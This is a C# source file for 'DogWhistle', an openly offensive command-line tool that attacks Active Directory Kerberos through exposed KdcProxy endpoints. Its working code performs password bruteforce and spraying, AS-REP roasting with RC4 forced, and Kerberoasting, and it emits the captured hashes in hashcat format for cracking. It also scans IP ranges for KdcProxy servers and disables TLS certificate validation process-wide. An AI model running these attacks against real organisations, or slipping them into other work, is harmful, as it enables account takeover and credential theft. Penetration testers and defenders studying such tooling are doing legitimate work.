using System;
using System.Threading.Tasks;
using Kerberos.NET.Client;
using Kerberos.NET.Configuration;
using Kerberos.NET.Credentials;
using Kerberos.NET.Crypto;
using Kerberos.NET.Entities;
using Kerberos.NET.Transport;
using System.Net;
using System.IO;
using NetTools;
using System.Net.Sockets;

namespace DogWhistle
{
    class Program
    {
        static void getHelp()
        {
            Console.WriteLine("" +
                "Ask TGT:           DogWhistle.exe asktgt <kdcproxy> <internal domain> <username> <password>\n\n" +
                "Bruteforce:        DogWhistle.exe bruteforce <kdcproxy> <internal domain> <username> <path-to-password-file>\n" +
                "                   BEWARE! KdcProxy will lock authentication for about 10 minutes after 11 invalid retries. Internal password policys may lock account sooner!\n\n" +
                "Password spray:    DogWhistle.exe spray <kdcproxy> <internal domain> <path-to-username-file> <password>\n\n" +
                "ASREPRoast:        DogWhistle.exe asreproast <kdcproxy> <internal domain> <username-without-pre-auth-req>\n\n" +
                "Kerberoast:        DogWhistle.exe kerberoast <kdcproxy> <internal domain> <username> <password> <spn>\n\n" +
                "Scan:              DogWhistle.exe scan <host/ip/range> <port>\n\n" +
                "Examples:\n" +
                ".\\DogWhistle.exe asktgt https://192.0.2.200/KdcProxy pwn.lab administrator P@ssw0rd!\n" +
                ".\\DogWhistle.exe scan 192.0.2.1-254 443\n" +
                "\nThis tool does not perform server certificate validation!" +
                "\n");
        }

        // KrbClient that stores krb5cc in current directory
        public static KerberosClient DWKrbClient(Krb5Config config, HttpsKerberosTransport transport, string upn)
        {
            KerberosClient client = new KerberosClient(config, null, transport);
            client.Configuration.Defaults.DefaultCCacheName = "FILE:" + Directory.GetCurrentDirectory() + "\\" + upn + ".krb5cc";
            client.CacheInMemory = false;
            return client;
        }
        static async Task AskTGT(string upn, string password, Krb5Config config, HttpsKerberosTransport transport)
        {
            KerberosPasswordCredential kerbCred = new KerberosPasswordCredential(upn, password);
            var client = DWKrbClient(config, transport, upn);

            try
            {
                await client.Authenticate(kerbCred);

                var tgtCache = client.Cache.GetCacheItem<KerberosClientCacheEntry>($"krbtgt/{client.DefaultDomain}");
                var tgtTicket = tgtCache.KdcResponse.Ticket;

                Console.WriteLine($"Authentication successful for {upn} \tTGT acquired: {tgtTicket.SName.FullyQualifiedName}");
                Console.WriteLine($"TGT written to .\\{upn}.krb5cc");

            }
            catch (Exception e)
            {
                Console.WriteLine($"Error: {e.Message.ToString()}");
                Console.WriteLine("Check credentials and/or KdcProxy URL");

            }
        }

        static async Task BruteSpray(string action, string staticTarget, string inputFile, string domain, Krb5Config config, HttpsKerberosTransport transport)
        {
            string upn;
            string target;
            KerberosPasswordCredential kerbCred = null;
            KerberosClient client = new KerberosClient(config, null, transport);

            foreach (string line in System.IO.File.ReadLines(inputFile))
            {
                switch (action)
                {
                    case "bruteforce":
                        kerbCred = new KerberosPasswordCredential(staticTarget, line);
                        break;
                    case "spray":
                        upn = line + "@" + domain;
                        kerbCred = new KerberosPasswordCredential(upn, staticTarget);
                        break;
                }

                try
                {
                    target = (action == "bruteforce" ? "password: " : "username: ");
                    Console.WriteLine($"Trying {target} {line}");

                    await client.Authenticate(kerbCred);

                    var tgtCache = client.Cache.GetCacheItem<KerberosClientCacheEntry>($"krbtgt/{client.DefaultDomain}");
                    var tgtTicket = tgtCache.KdcResponse.Ticket;

                    Console.WriteLine($"Authentication successful for {staticTarget} \nTGT acquired for: {tgtTicket.SName.FullyQualifiedName} \tUsing {target} {line}");

                    // Do not try more passwords
                    if (action == "bruteforce")
                    {
                        break;
                    }

                }
                catch (Exception e)
                {
                    // implement better exception handling/feedback
                    //Console.WriteLine($"Error: {e.Message.ToString()}");
                }
                kerbCred = null;
            }
        }

        static async Task ASREPRoast(string upn, HttpsKerberosTransport transport)
        {
            // Password not used, but required
            KerberosPasswordCredential kerbCred = new KerberosPasswordCredential(upn, "pwd-not-used-getzmezomhashez");

            // Create AS-REQ
            var asReq = KrbAsReq.CreateAsReq(kerbCred,
                    AuthenticationOptions.RepPartCompatible |
                    AuthenticationOptions.IncludePacRequest |
                    AuthenticationOptions.RenewableOk |
                    AuthenticationOptions.Canonicalize |
                    AuthenticationOptions.Renewable |
                    AuthenticationOptions.Forwardable
                    );

            // Force RC4
            EncryptionType[] encryptionTypes = { EncryptionType.RC4_HMAC_NT };
            asReq.Body.EType = encryptionTypes;

            try
            {
                // Send request
                var resp = await transport.SendMessage<KrbAsRep>(kerbCred.Domain, asReq.EncodeApplication());

                // Convert byte array to string
                string asrepHash = BitConverter.ToString(resp.EncPart.Cipher.ToArray()).Replace("-", string.Empty);


                asrepHash = asrepHash.Insert(32, "$");

                // Hashcat format - from Rubeus
                var hashString = String.Format("$krb5asrep$23${0}:{1}", upn, asrepHash);

                Console.WriteLine($"AS-REP Hash: {hashString}");
            }
            catch (Exception e)
            {
                Console.WriteLine($"Error: {e.Message.ToString()}");
            }
        }
        static async Task Kerberoast(string upn, string password, string spn, Krb5Config config, HttpsKerberosTransport transport)
        {
            var kerbCred = new KerberosPasswordCredential(upn, password);

            KerberosClient client = new KerberosClient(config, null, transport);
            client.Configuration.Defaults.AllowWeakCrypto = true;

            try
            {
                await client.Authenticate(kerbCred);

                var ticket = await client.GetServiceTicket(spn);
                var encType = ((int)ticket.Ticket.EncryptedPart.EType);
                var sname = ticket.Ticket.SName.FullyQualifiedName;
                var kerberoastDomain = ticket.Ticket.Realm;
                var cipherText = BitConverter.ToString(ticket.Ticket.EncryptedPart.Cipher.ToArray()).Replace("-", string.Empty);
                var kerberoastUser = "unknown"; // Usually fetched from LDAP?

                // Hashcat format - from Rubeus
                var tgsrepHash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, kerberoastUser, kerberoastDomain, sname, cipherText.Substring(0, 32), cipherText.Substring(32));

                Console.WriteLine($"TGS-REP hash: {tgsrepHash}");
            }
            catch (Exception e)
            {
                Console.WriteLine($"Error: {e.Message.ToString()}");
            }
        }

        static async Task Scanner(string destination, int port)
        {
            IPAddressRange ipAddressRange;

            bool destinationIsDns = false;

            // Check if destination is IP or hostname
            if (!IPAddressRange.TryParse(destination, out ipAddressRange))
            {
                try
                {
                    IPAddressRange.TryParse(Dns.GetHostEntry(destination).AddressList[0].ToString(), out ipAddressRange);
                }
                catch (Exception e)
                {
                    Console.WriteLine($"Error: {e.Message.ToString()}");
                    return;
                }

                destinationIsDns = true;
            }

            foreach (var ipaddress in ipAddressRange)
            {
                bool result = false;
                var resultTCP = false;

                using (TcpClient tcpClient = new TcpClient())
                {
                    resultTCP = tcpClient.ConnectAsync(ipaddress, port).Wait(1000);
                }

                if (resultTCP)
                {
                    string KdcProxyUrl = $"https://{ipaddress}:{port}/KdcProxy";
                    // Krb config
                    var config = Krb5Config.Default();
                    config.Realms["HAXX.TEST"].Kdc.Add(KdcProxyUrl);
                    config.Realms["HAXX.TEST"].KPasswdServer.Add(KdcProxyUrl);
                    config.Defaults.DnsLookupKdc = false;
                    config.Defaults.DnsUriLookup = false;


                    // Create transport and bind krb config
                    HttpsKerberosTransport transport = new HttpsKerberosTransport();
                    transport.Configuration = config;

                    KerberosPasswordCredential kerbCred = new KerberosPasswordCredential("haxx@haxx.test", "haxx");

                    // Create AS-REQ
                    var asReq = KrbAsReq.CreateAsReq(kerbCred, AuthenticationOptions.AllAuthentication);

                    try
                    {
                        var resp = await transport.SendMessage<KrbAsRep>(kerbCred.Domain, asReq.EncodeApplication());
                    }
                    catch (Exception e)
                    {
                        try
                        {
                            // KdcProxy will send TCP RST if it can't find Kerberos DNS Name, regular Web server will send HTTP status code.
                            if (e.InnerException.InnerException.InnerException.ToString().Contains("An existing connection was forcibly closed by the remote host"))
                            {
                                result = true;
                            }
                        }
                        catch { }
                    }
                }

                if (result)
                {
                    if (destinationIsDns)
                    {
                        Console.WriteLine($"{ipaddress} ({destination}): Possible KdcProxy");
                    }
                    else
                    {
                        Console.WriteLine($"{ipaddress}: Possible KdcProxy");
                    }
                }
                else
                {
                    if (destinationIsDns)
                    {
                        Console.WriteLine($"{ipaddress} ({destination}): No KdcProxy");
                    }
                    else
                    {
                        Console.WriteLine($"{ipaddress}: No KdcProxy");
                    }
                }



            }
        }

        static async Task Main(string[] args)
        {
            Console.WriteLine("" +
            " ╔═══╗        ╔╗╔╗╔╗╔╗         ╔╗ ╔╗     \n" +
            " ╚╗╔╗║        ║║║║║║║║        ╔╝╚╗║║     \n" +
            "  ║║║║╔══╗╔══╗║║║║║║║╚═╗╔╗╔══╗╚╗╔╝║║ ╔══╗\n" +
            "  ║║║║║╔╗║║╔╗║║╚╝╚╝║║╔╗║╠╣║══╣ ║║ ║║ ║╔╗║\n" +
            " ╔╝╚╝║║╚╝║║╚╝║╚╗╔╗╔╝║║║║║║╠══║ ║╚╗║╚╗║║═╣\n" +
            " ╚═══╝╚══╝╚═╗║ ╚╝╚╝ ╚╝╚╝╚╝╚══╝ ╚═╝╚═╝╚══╝\n" +
            "          ╔═╝║                           \n" +
            "          ╚══╝                           \n" +
            " #        Offensive KdcProxy tool         #\n" +
            " # https://github.com/1njected/DogWhistle #\n");

            // Read args
            if (!(args.Length >= 3))
            {
                getHelp();
                return;
            }

            // Disable TLS verification
            ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => { return true; };

            string action = args[0];

            if (action == "scan")
            {
                await Scanner(args[1], int.Parse(args[2]));
                return;
            }

            string kdcProxy = args[1];
            string domain = args[2];
            string username;
            string upn;

            string password;

            // Krb config
            var config = Krb5Config.Default();
            config.Realms[domain.ToUpper()].Kdc.Add(kdcProxy);
            config.Realms[domain.ToUpper()].KPasswdServer.Add(kdcProxy);
            config.Defaults.DnsLookupKdc = false;
            config.Defaults.DnsUriLookup = false;

            // Create transport and bind krb config
            HttpsKerberosTransport transport = new HttpsKerberosTransport();
            transport.Configuration = config;

            switch (action.ToLower())
            {
                case "asktgt" when args.Length == 5:
                    username = args[3];
                    password = args[4];
                    upn = username + "@" + domain;
                    await AskTGT(upn, password, config, transport);
                    break;

                case "bruteforce" when args.Length == 5:
                    username = args[3];
                    upn = username + "@" + domain;
                    string passwordlist = args[4];

                    if (File.Exists(passwordlist))
                    {
                        await BruteSpray("bruteforce", upn, passwordlist, domain, config, transport);
                    }
                    else
                    {
                        Console.WriteLine("File does not exist");
                    }

                    break;

                case "spray":
                    string usernamelist = args[3];
                    if (File.Exists(usernamelist))
                    {
                        password = args[4];
                        await BruteSpray("spray", password, usernamelist, domain, config, transport);
                    }
                    else
                    {
                        Console.WriteLine("File does not exist");
                    }
                    break;

                case "asreproast" when args.Length == 4:
                    username = args[3];
                    upn = username + "@" + domain;
                    await ASREPRoast(upn, transport);
                    break;

                case "kerberoast" when args.Length == 6:
                    username = args[3];
                    password = args[4];
                    upn = username + "@" + domain;
                    var spn = args[5];
                    await Kerberoast(upn, password, spn, config, transport);
                    break;

                default:
                    Console.WriteLine("Invalid command");
                    getHelp();
                    break;
            }
        }
    }
}
